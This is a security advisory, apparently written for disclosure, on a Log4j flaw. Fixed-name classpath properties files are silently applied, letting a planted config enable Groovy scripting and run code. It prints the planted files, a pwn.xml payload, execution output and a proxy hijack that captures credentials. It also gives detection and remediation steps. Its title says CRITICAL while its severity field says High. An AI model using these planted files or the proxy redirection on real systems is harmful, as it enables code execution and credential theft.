# CRITICAL — Remote Code Execution in Apache Log4j via silently trusted classpath resources

**Finding:** `log4j-api` reads two fixed-name resources from the classpath and applies them
without being asked — one becomes **JVM system properties**, the other becomes **Log4j's
configuration**. One file on the classpath is enough for code execution in the application.

**Severity:** High
**CVSS 3.1 (base):** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **7.8 (High)**
**CWE:** CWE-426 (untrusted search path) → CWE-94 (improper control of generation of code) /
CWE-200 (information exposure)
**Component:** `org.apache.logging.log4j:log4j-api` (the property loader) and
`org.apache.logging.log4j:log4j-core` (the configuration that gets hijacked)
**Verified vulnerable by execution:** 2.14.1, 2.17.1, 2.24.0, 2.25.1, 2.26.1 (current release);
`log4j-api` alone (no `log4j-core`, no logging provider) for the system-property half
**Verified not reachable:** properties the JVM reads at start-up — the JMX agent was tested and
rejected (§11)
**Disclosure status:** one report covering both findings from this audit — see
`DISCLOSURE.md`.

Everything below was derived by reading the sources in `sources/` and by running the attacks in
`lab/`. The exploitability claims are measured output of `lab/verify.sh` (15 assertions, all
passing — see Appendix B), not restatements of an advisory database.

**The short version.** Log4j reads two files by fixed name from the classpath — one of them is
`log4j2.system.properties` — and does what they say: the file's keys become JVM system
properties, and the file can point Log4j at a different configuration file and switch scripting
on. Someone who can put that file on the classpath therefore controls the application's JVM
configuration and can run code in it, on the current Log4j release, with no attacker data in the
logs and no warning in the application's log output. The whole analysis follows; §1 is the
mechanism, §2–§4 are the measurements, §5 and §8–§10 are the scale, §6–§7 are what to do about
it.

### Severity rationale

**The score follows the precondition, not the worst case.** The attacker's precondition is the
ability to place a file on the victim's classpath: write access to a classpath directory, or
control of an artifact in the dependency chain. That is a local write primitive, so the base
vector scores it as `AV:L / PR:L` with no scope change — the impact stays inside the trust
domain the attacker has already reached. Scoring it `AV:N/PR:N` would describe a delivery mode
(dependency resolution) that depends on the victim's build, not the finding itself.

| Metric | Value | Justification, grounded in this lab |
| --- | --- | --- |
| Attack Vector (AV) | Local | The precondition is placing a file on the classpath: a shared deployment directory, a build workspace, a writable container layer, a current directory used by a start script. Measured: a file in a classpath directory and the same file inside a jar (§2.3). |
| Attack Complexity (AC) | Low | One file with fixed, guessable names. No race, no timing, no memory grooming, no gadget chain, no victim interaction. Measured: a single `java -cp …` invocation. |
| Privileges Required (PR) | Low | Write access to a directory on the classpath. In the dependency-chain delivery mode the attacker instead needs the ability to publish or replace an artifact — which is a *higher* privilege in the victim's organisation, not a lower one. |
| User Interaction (UI) | None | Fully automatic: Log4j reads the file during its own initialization, and the script filter executes during configuration start-up — before the application's first log statement (measured, §2.2). |
| Scope (S) | Unchanged | The attacker who can write to a classpath directory already has write access inside the victim's trust domain; code execution in the application does not cross into a different security authority. **If** the writable directory belongs to a different account than the service (a shared host), the impact does cross an authority boundary, and the score becomes `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 8.8. That is deployment-dependent, so it is not the base case. |
| Confidentiality (C) | High | Arbitrary code in the app process: read any file, env var, secret, key material. Independently, the plant redirects the application's outbound traffic (measured, §4). |
| Integrity (I) | High | Arbitrary code; and the application's logging configuration — its evidence trail — is under the attacker's control. |
| Availability (A) | High | Arbitrary code: kill the process, consume resources, pivot to the next service on the same classpath. |

CVSS 3.1 base score for `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **7.8 (High)**. For reference,
the same vector with `AV:N/PR:N` — the dependency-chain delivery mode — is 9.8 with `S:U` and
10.0 with `S:C`; the score above is the weakest-access variant on purpose, because it is the
one the finding requires to be true.

---

## 1. The defect

### 1.1 Two fixed-name classpath resources

| file | read by | what it does |
| --- | --- | --- |
| `log4j2.system.properties` | `log4j-api` `util/PropertiesUtil` | **every key is copied into the JVM system properties** |
| `log4j2.component.properties` | `log4j-api` `util/PropertiesUtil` | Log4j's own properties — the configuration file location and the script language list |

`log4j-api` 2.26.1, `org/apache/logging/log4j/util/PropertiesUtil.java:64-69`:

```java
private static final String LOG4J_PROPERTIES_FILE_NAME = "log4j2.component.properties";
private static final String LOG4J_SYSTEM_PROPERTIES_FILE_NAME = "log4j2.system.properties";
```

`log4j-api` 2.26.1, `util/PropertiesUtil.java:506-519` — the whole of the behaviour:

```java
private Environment(final PropertySource propertySource) {
    final PropertySource sysProps = new PropertyFilePropertySource(LOG4J_SYSTEM_PROPERTIES_FILE_NAME, false);
    try {
        sysProps.forEach((key, value) -> {
            if (System.getProperty(key) == null) {
                System.setProperty(key, value);          // <-- global JVM state, from a classpath file
            }
        });
    } catch (final SecurityException e) {
        LOGGER.warn("Unable to set Java system properties from {} file, due to security restrictions.",
                LOG4J_SYSTEM_PROPERTIES_FILE_NAME, e);
    }
```

The file is located on the classpath by `util/PropertyFilePropertySource.java:50-55` →
`util/LoaderUtil.java:461-491`, which searches three class loaders:

```java
final ClassLoader[] candidates = {
        useTccl ? getThreadContextClassLoader() : null,
        LoaderUtil.class.getClassLoader(),
        GET_CLASS_LOADER_DISABLED.getAsBoolean() ? null : ClassLoader.getSystemClassLoader()
};
```

The third one is the **system class loader**, i.e. the application's whole classpath — jars
included. A `log4j2.system.properties` inside any jar on the classpath is found.

Note the priority rule in the loop above: a system property that already exists is never
overwritten. That matters for the attack in neither direction — the attacker wants the *new*
value, and the victim does not set these properties itself.

### 1.2 Two Log4j properties turn it into code execution

| property | where | effect |
| --- | --- | --- |
| `log4j.configurationFile` | `log4j-core` 2.26.1 `config/ConfigurationFactory.java:89`, read at `:457-460` | the configuration Log4j loads — the value may name a **classpath resource** |
| `log4j2.Script.enableLanguages` | `log4j-core` 2.26.1 `util/Constants.java:52` | enables the script engine the attacker's configuration uses |

`config/ConfigurationFactory.java:457-460`:

```java
final String configLocationStr = this.substitutor.replace(
        PropertiesUtil.getProperties().getStringProperty(CONFIGURATION_FILE_PROPERTY));
```

`PropertiesUtil.getProperties()` merges the JVM system properties (priority 0, live view of
`System.getProperties()`), the component properties file, the environment, and the service-loaded
property sources — so a property that the planted file set into the JVM system properties is
honoured here.

Ordering works in the attacker's favour: the `Environment` constructor that copies the planted
file into the system properties runs on the **first** `PropertiesUtil.getProperties()` call, which
is the same call that reads the configuration file location. The planted value is therefore
already in place when it is read.

### 1.3 The mechanism is documented — the trust model is not

**What the documentation says.** The Log4j 2.x manual, *Configuration properties*
(<https://logging.apache.org/log4j/2.x/manual/systemproperties.html>):

> *"If a `log4j2.system.properties` file is available on the classpath its contents are sourced
> into Java system properties at Log4j startup."*

That is accurate, and the code does exactly that. The file name, the classpath lookup and the
copy into the system properties are all documented or plainly visible in the source.

**What the documentation does not say.**

* It does not state that the classpath is a trust boundary — that anything on the classpath can
  reconfigure the JVM. The project's own threat-model page
  (<https://logging.apache.org/log4j/2.x/security.html>) enumerates what Log4j trusts and does
  not trust, and the classpath is not among them.
* It does not say that the file is applied to the **JVM's global namespace** rather than to
  Log4j's own namespace. "Sourced into Java system properties" reads like a convenience for
  operators; the consequence is that a classpath resource sets global JVM configuration.
* It does not mention that the same mechanism can point Log4j at a *different configuration
  file* (`log4j.configurationFile`) and enable script execution
  (`log4j2.Script.enableLanguages`) — the two properties that turn this into a code-execution
  path rather than a settings file.
* It does not say what happens when the file is found: the product prints nothing. There is no
  `StatusLogger` message, no warning, no record that the file was applied.
* It does not say that the file need not come from Log4j. Any artifact on the classpath can
  carry one.

**Why this is a vulnerability and not a hardening gap.** The line between the two is whether the
vendor has stated a trust assumption that a reader can rely on. Here:

1. **The outcome is code execution.** A hardening gap is a setting that can be misused; this is a
   documented convenience that reaches code execution in the application JVM, through two
   properties the documentation never mentions in this context.
2. **The trust assumption is not written down.** "The classpath is trusted" is a defensible
   position for a library — but it is a position the reader cannot know, and the project's own
   threat model states its other assumptions explicitly.
3. **The product's own policy is circumvented.** Log4j deliberately refuses to evaluate lookups
   inside results on the runtime path, precisely because context data may be attacker-controlled
   (`RuntimeStrSubstitutor` vs `ConfigurationStrSubstitutor`). The classpath file delivers
   attacker-chosen values into a namespace that the *configuration* path does evaluate
   recursively, so a value smuggled in as a system property is evaluated by the configuration
   substitutor — the guardrail that protects the runtime path does not extend to this input
   channel. *Measured:* a planted `lab.leak=${env:HOME}`, read back through `${sys:lab.leak}` in
   a configuration pattern, comes out expanded — `LEAK=[/home/hayden]`, not the literal
   expression (`lab/src/lab/PolicyProbe.java`, asserted by `lab/verify.sh`).
4. **It happens silently and by default.** No opt-in, no warning, no trace.

If the project considers the classpath a trust boundary, the reasonable outcome is a documented
statement to that effect, plus a `StatusLogger` warning when either file is found, plus an
explicit opt-in for the system-property copy. That is a small change, and it is the change this
finding is asking for.

### 1.4 The 3.x line

`log4j-api` 3.0.0-beta2, `org/apache/logging/log4j/util/PropertiesUtil.java:70, 675-682`:

```java
private static final String LOG4J_SYSTEM_PROPERTIES_FILE_NAME = "log4j2.system.properties";
...
final Properties sysProps = PropertyFilePropertySource.loadPropertiesFile(LOG4J_SYSTEM_PROPERTIES_FILE_NAME);
for (String key : sysProps.stringPropertyNames()) {
    if (System.getProperty(key) == null) {
        System.setProperty(key, sysProps.getProperty(key));
    }
}
```

Identical behaviour in the 3.x API.

---

## 2. The chain to RCE, measured

### 2.1 The planted files

`lab/poison/log4j2.system.properties`:

```properties
lab.planted=planted-by-attacker
log4j.configurationFile=pwn.xml
log4j2.configurationFile=pwn.xml
log4j2.Script.enableLanguages=Groovy
```

`lab/poison/pwn.xml` — an ordinary Log4j configuration whose filter runs a Groovy script:

```xml
<ScriptFilter onMatch="NEUTRAL" onMismatch="NEUTRAL">
  <Script language="groovy" scriptText="def proc = 'id'.execute(); ...; true"/>
</ScriptFilter>
```

### 2.2 The result

Running an application that has no Log4j configuration of its own — no attacker-controlled log
content, no MDC, no optional Log4j feature:

```
[1] planted system property BEFORE log4j init : null
=== PAYLOAD EXECUTED IN VICTIM JVM (planted config) ===
RCE via planted log4j2.system.properties (classpath pre-positioning) as hayden
uid=1000(hayden) gid=1000(hayden) groups=1000(hayden),4(adm),24(cdrom),27(sudo),...
=== END PAYLOAD ===
13:03:23 INFO  victim - first log statement triggers log4j initialization
[2] planted system property AFTER  log4j init : planted-by-attacker
[3] effective log4j config location             : pwn.xml
[4] script languages enabled                     : Groovy
[5] attacker script executed (marker file)       : true
```

The payload runs **before the victim's own log statement is rendered**: the attacker's
configuration replaces the victim's, and the script filter executes during configuration
initialisation.

### 2.3 Three independent vectors

| vector | file on the classpath | result |
| --- | --- | --- |
| A — JVM system properties | `log4j2.system.properties` | RCE, plus arbitrary JVM system properties |
| B — Log4j configuration | `log4j2.component.properties` | RCE (the file alone, without variant A) |
| C — supply chain | either file **inside a dependency jar** | RCE |

### 2.4 Negative control

The same application without the planted file:

```
[2] planted system property AFTER  log4j init : null
[3] effective log4j config location             : null
[4] script languages enabled                     : null
[5] attacker script executed (marker file)       : false
```

---

## 3. Version matrix and blast radius

| log4j-core | 2.14.1 | 2.17.1 | 2.24.0 | 2.25.1 | **2.26.1** | 3.0.0-beta3 |
| --- | --- | --- | --- | --- | --- | --- |
| RCE via planted classpath resource | yes | yes | yes | yes | **yes** | source-level only (§11) |

The more important row is the api-only one. With **only `log4j-api` on the classpath** — no
`log4j-core`, no appender, no configuration, and the API reporting *"Log4j API could not find a
logging provider"* — the planted file still rewrites the JVM's system properties:

```
[api-only] planted property BEFORE log4j init : null
2026-10-23T17:03:44.240Z main ERROR Log4j API could not find a logging provider.
[api-only] planted property AFTER  log4j init : planted-by-attacker
[api-only] log4j.configurationFile             : pwn.xml
```

| log4j-api | 2.14.1 | 2.26.1 |
| --- | --- | --- |
| planted file rewrites JVM system properties | yes | yes |

`log4j-api` is a transitive dependency of a large part of the Java ecosystem, so the exposed
population is "every application that has Log4j on its classpath", not "every application that
configured Log4j".

---

## 4. The plant reaches past Log4j

Because it sets **JVM** system properties, it reaches application behaviour that has nothing to
do with logging. With `http.proxyHost` / `http.proxyPort` planted, the victim's outbound request
went to the attacker's proxy (`lab/proxy_capture.py`):

```
--- victim stdout ---
[proxy-victim] http.proxyHost = 127.0.0.1
[proxy-victim] http.proxyPort = 8899
[proxy-victim] response status = 200
--- captured by attacker proxy ---
GET http://vault.internal/api/login?user=alice&token=s3cr3t HTTP/1.1
User-Agent: Java/1.8.0_504
Host: vault.internal
```

The credentials in the request URL were read by the attacker because a file on the classpath
said so. The same mechanism reaches `javax.net.ssl.trustStore` (the application's TLS trust
decisions), `http.proxyHost`/`https.proxyHost`, and any property a library reads lazily.

---

## 5. Target, reach, impact

**Target.** The primitive lives in `log4j-api`, so any process that merely *has* Log4j on its
classpath is a candidate — including services that never configure Log4j, and including
applications whose only Log4j dependency is transitive. The *attacker's* target is a classpath
location, not an application.

**Reach.** Zero interaction and zero configuration:

* no attacker-controlled log content is needed;
* no Thread Context Map is needed;
* the victim does not have to use any optional Log4j feature — scripting is switched on *by the
  planted file*;
* the victim's own configuration is replaced, so the attacker's configuration decides what is
  logged and what is not;
* nothing is printed. `StatusLogger` stays silent, the application sees a normal start-up.

**Pre-positioning.** One file with a fixed, guessable name in a directory that is on the
victim's classpath and writable by someone else:

* a shared application server or deployment directory (`/opt/app/lib`, `WEB-INF/lib`) writable by
  the deploy account while the service runs as another account;
* a build agent or CI runner whose workspace is on the classpath (including the current
  directory, which is on the classpath for a large share of legacy start scripts);
* any writable directory in a container image that is passed with `-cp`.

**Supply chain.** The file can equally live *inside a jar* — measured: a single jar containing
`log4j2.system.properties` and `pwn.xml`, dropped on the classpath, produced the same RCE. The
delivery vector is therefore a dependency, and the file stays inert until Log4j runs in an
application that resolves it. Nothing in the artifact looks like an attack — it is two small
text files with innocuous names.

**Impact.** Three separable consequences:

| consequence | how | measured |
| --- | --- | --- |
| **Access** — code execution in the target JVM | configuration hijack → script filter | yes |
| **Collection** — the target's outbound traffic, including credentials | arbitrary JVM system properties (`http.proxyHost`, `javax.net.ssl.trustStore`, …) | proxy interception measured; `javax.net.ssl.trustStore` not separately exercised |
| **Stealth** — the attacker's configuration decides what the logs contain | the victim's configuration is replaced | yes (planted config in force) |

This is a different shape of risk from Log4Shell: Log4Shell needed a vulnerable Log4j version
(closed since 2.17.1) and attacker-controlled data flowing through the logging path. This works
on the **current** release, needs **no vulnerable version** and **no attacker-controlled data**,
and needs **no cooperation from the application's configuration** — the application's
configuration is what gets overwritten. What it does need is a way to place a file on the
classpath, which is what the score reflects.

---

## 6. Detection

* Look for `log4j2.system.properties` and `log4j2.component.properties` on every classpath the
  application uses: `find / -name 'log4j2.*.properties'` and inside every jar
  (`unzip -l <jar> | grep log4j2`). `scan/scan_planted.py` does both.
* Audit the JVM's system properties of a running service against the application's own
  configuration: any difference is the plant.
* Look for a Log4j configuration in a jar or directory that the deployment did not put there.
* On the wire: a start-up request to an unexpected host (the `ScriptFile` variant fetches a
  script over HTTP), or outbound traffic to a proxy that the deployment does not use.
* `StatusLogger` messages: `Error running script …`, `No script with name … has been declared`.

---

## 7. Remediation

Do these now:

* **Audit every classpath** — every deployment directory, every container image, every jar in
  every artifact — for `log4j2.system.properties` and `log4j2.component.properties`. A match is
  an incident, not a finding: assume the configuration was taken over until proven otherwise.
* **Remove the files** from artifacts and from deployment directories, then re-build and
  re-deploy the artifacts that contained them. Deleting the file from a running host is not
  enough — if it was in the artifact, the next deploy brings it back.
* **Make the classpath a trust boundary.** Nothing on it may be writable by anyone other than
  the identity that runs the application. Verify every jar on it by checksum in CI, and verify
  the *contents* of the build workspace before packaging.
* **Keep scripting disabled** (`log4j2.Script.enableLanguages` unset). It is the execution path
  the plant uses, and an environment without a JSR-223 engine fails closed.
* **Do not ship `log4j2.system.properties` or `log4j2.component.properties`** in an artifact
  unless that is the artifact's documented purpose.

Upstream fix direction — Log4j should not silently promote a classpath resource into JVM system
properties. At minimum it should:

* require an explicit opt-in for that behaviour;
* log a warning through `StatusLogger` when either file is found;
* refuse to take the configuration file location from a classpath resource.

---

## 8. How far one file reaches — *analysis, not measurement*

The mechanism is general; the interesting question is where the file comes from in practice.
Everything in this section is **reasoning from the mechanism**. No pipeline, CI system or shared
host was tested, and no compromise of one is claimed. What *is* measured is the last step below,
in isolation (§2.2): the file is applied at start-up, the attacker's configuration takes over,
and the code runs.

The path that needs no luck:

1. **A build agent or CI runner whose workspace is writable by another account.** The attacker
   writes `log4j2.system.properties` and `pwn.xml` into the build output directory.
2. **The normal release process packages them.** Nothing in a build pipeline looks at two small
   text files with familiar names.
3. **Every environment that consumes the artifact inherits it** — staging, production, every
   region, every replica. The file is inert until Log4j runs, and then it runs with the
   application's privileges.
4. **Nothing in the application's own logs records it.** The attacker's configuration decides
   the log level, so it can also remove the evidence from the log stream.

The attacker does not need to find the application, does not need to interact with it, does not
need to guess a URL, and does not need to be lucky about timing. That is why the classpath — not
the application — is the thing to audit.

Two variants deserve separate mention because they do not need a build pipeline at all:

* **A shared application server.** A directory on the classpath (`/opt/app/lib`, `WEB-INF/lib`)
  that the deploy account can write to, while the service runs as a different account. Here the
  impact crosses an account boundary, which is the case in which the score becomes 8.8 rather
  than 7.8 (see the severity rationale).
* **A writable current directory.** The current directory is on the classpath for a large share
  of legacy start scripts (`java -cp .:lib/* …`), which turns "a writable working directory"
  into "control of the application's configuration".

---

## 9. Defence evasion

The plant's second effect is the one that makes it hard to find: **the attacker's configuration
replaces the victim's**. Three consequences follow — the first and third are measured, the
second follows from the mechanism:

* **The evidence can be suppressed.** The attacker's `pwn.xml` is a normal Log4j configuration.
  It can set the root level, choose the layout, or point the appender somewhere else. The
  application's log stream is under the attacker's control from the moment the application
  starts. *(Measured: the planted configuration was in force — the victim's own configuration
  was not used.)*
* **Re-application.** If the file is inside the artifact, it is read again at every start; if it
  is in the deployment directory, likewise. Neither requires the attacker to be present at the
  moment of exploitation. *(Follows from the mechanism — the file is read during Log4j
  initialization, which happens on every start. Not separately measured.)*
* **The forensic trail is thin.** `StatusLogger` prints nothing when it finds either file — the
  copy of `PropertiesUtil` that reads `log4j2.system.properties` has no log statement at all,
  only a warning for the `SecurityException` case. The only observable trace of the RCE path is
  whatever the payload itself emits. *(Measured: the victim's log output contained no warning.)*

The detection guidance in §6 is therefore not "watch the logs" but "audit the classpath".

---

## 10. Comparison with Log4Shell

| | Log4Shell (CVE-2021-44228) | this finding |
| --- | --- | --- |
| Vulnerable versions required | yes — fixed in 2.17.1 | **no — the current release is affected** |
| Attacker-controlled data must reach the log path | yes | **no** |
| Thread Context Map involvement | in some variants | **no** |
| Application's configuration must be unusual | no | **no** — the configuration is what gets replaced |
| Any optional Log4j feature must be enabled | no | **no** — scripting is enabled by the planted file |
| Affects applications that only have `log4j-api` | no | **yes** |
| Leaves a trace in the logs | often (errors, outbound LDAP) | **no** — the attacker's configuration controls the logs |
| Needs the victim to do something | send a request | **no** |
| Delivery | a string in a request | **a file on the classpath** |
| Attacker's precondition | send a request | **write access to a classpath location, or control of a dependency** |
| CVSS 3.1 | 10.0 (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) | **7.8** (`AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) — see the severity rationale |

The two findings are independent: neither needs the other, and fixing Log4Shell (2.16.0,
2.17.1) does not affect this one.

---

## 11. What I did not verify

* **Log4j 3.x at runtime.** `log4j-core:3.0.0-beta3` needs `log4j-api:3.0.0-beta3`, which is not
  published (`log4j-api` stops at `3.0.0-beta2`), and the beta2/beta3 combination does not load
  together. The 3.x statements rest on the 3.0.0-beta2 API source (§1.4).
* **A JMX agent was tested and rejected.** The obvious second-stage idea — planting
  `com.sun.management.jmxremote.port` to open an unauthenticated management port — does not work:
  the JMX agent reads its configuration during JVM start-up, before Log4j initializes. Verified
  both ways: with `-Dcom.sun.management.jmxremote.port=…` on the command line the port opens; with
  the property planted by Log4j it does not. Properties the JVM reads at start-up are therefore
  out of reach of this finding; properties read lazily (proxy, TLS trust store, most libraries)
  are in reach (§4).
* The plant needs a writable classpath entry or a poisoned dependency. That is the access
  condition; Log4j's contribution is that it trusts a fixed-name classpath resource implicitly,
  silently, and — for `log4j2.system.properties` — applies it as global JVM state.
* **The pipeline path in §8 is analysis, not measurement.** No build pipeline, CI system or
  shared host was tested. What was tested is the file in a classpath directory and the file
  inside a jar (§2.3), and the last step of the pipeline — the file being applied at start-up —
  in isolation (§2.2).
* `javax.net.ssl.trustStore` is named as an example of a property the plant can set; it was not
  separately exercised. `http.proxyHost` / `http.proxyPort` were (§4).
* The script chain was demonstrated with Groovy; any other JSR-223 engine behaves the same.

---

## Appendix A — repository contents

```
DISCLOSURE.md                     shared disclosure record: timeline, status, report text
lab/src/lab/ClasspathPoison.java  victim: an ordinary app on a poisoned classpath
lab/src/lab/ApiOnly.java          victim: log4j-api only, no core, no logging provider
lab/src/lab/ProxyVictim.java      victim: outbound traffic redirected by the plant
lab/src/lab/PolicyProbe.java      victim: a planted lookup expression evaluated recursively
lab/src/lab/JmxVictim.java        victim for the rejected JMX variant (§11)
lab/src/lab/JmxProbe.java         attacker side of the rejected JMX variant
lab/poison/                       planted classpath resources: log4j2.system.properties + pwn.xml
lab/poison-component/             planted classpath resource variant: log4j2.component.properties
lab/poison-jar/                   the same two files, shipped inside a dependency jar
lab/poison-proxy/                 planted http.proxyHost / http.proxyPort
lab/poison-policy/                planted lookup expression, read back through ${sys:…}
lab/poison-jmx/                   planted JMX properties (rejected variant, §11)
lab/proxy_capture.py              attacker-side fake HTTP proxy for the traffic proof
lab/build.sh                      compiles the victims and packs the poisoned dependency jar
lab/verify.sh                     asserts every claim in this document
scan/scan_planted.py              finds planted classpath resources on disk and inside jars
setup.sh                          downloads the jars and the sources the citations point at
sources/                          Log4j sources 2.26.1 and 3.0.0-beta2 (api)
```

## Appendix B — verification output

`./lab/verify.sh` (15 checks, JDK 8u504):

```
== 1: RCE through the planted log4j2.system.properties
PASS  2.14.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.17.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.24.0 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.25.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.26.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
== 2: RCE through the planted log4j2.component.properties
PASS  2.26.1 planted log4j2.component.properties                 expected=RCE                      got=RCE
== 3: supply chain - the planted resource inside a dependency jar
PASS  2.26.1 planted resource inside a dependency jar            expected=RCE                      got=RCE
== 4: negative controls
PASS  2.26.1 no planted file (must be blocked)                   expected=blocked                  got=blocked
== 5: log4j-api alone rewrites the JVM's system properties
PASS  2.14.1 log4j-api only: planted file rewrites JVM properties expected=planted-by-attacker      got=planted-by-attacker
PASS  2.26.1 log4j-api only: planted file rewrites JVM properties expected=planted-by-attacker      got=planted-by-attacker
PASS  2.26.1 log4j-api only, no planted file (must be clean)     expected=null                     got=null
== 6: the plant reaches past Log4j (outbound traffic redirected)
PASS  proxy captured the victim's request                        expected=captured                 got=captured
== 7: the planted value reaches the recursive (configuration) substitutor
PASS  planted property evaluated recursively at config time      expected=expanded                 got=LEAK=[/home/hayden]

ALL CHECKS PASSED
```

## Appendix C — references

* Log4j configuration properties documentation (the `log4j2.system.properties` classpath file) —
  <https://logging.apache.org/log4j/2.x/manual/systemproperties.html>
* Log4j 2.x security page (the project's own threat model) —
  <https://logging.apache.org/log4j/2.x/security.html>
* `log4j-api` 2.26.1 `org/apache/logging/log4j/util/PropertiesUtil.java:64-69, 506-519`
* `log4j-api` 2.26.1 `org/apache/logging/log4j/util/PropertyFilePropertySource.java:50-55`
* `log4j-api` 2.26.1 `org/apache/logging/log4j/util/LoaderUtil.java:461-491`
* `log4j-api` 3.0.0-beta2 `org/apache/logging/log4j/util/PropertiesUtil.java:70, 675-682`
* `log4j-core` 2.26.1 `org/apache/logging/log4j/core/config/ConfigurationFactory.java:89, 457-460`
* `log4j-core` 2.26.1 `org/apache/logging/log4j/core/util/Constants.java:52`
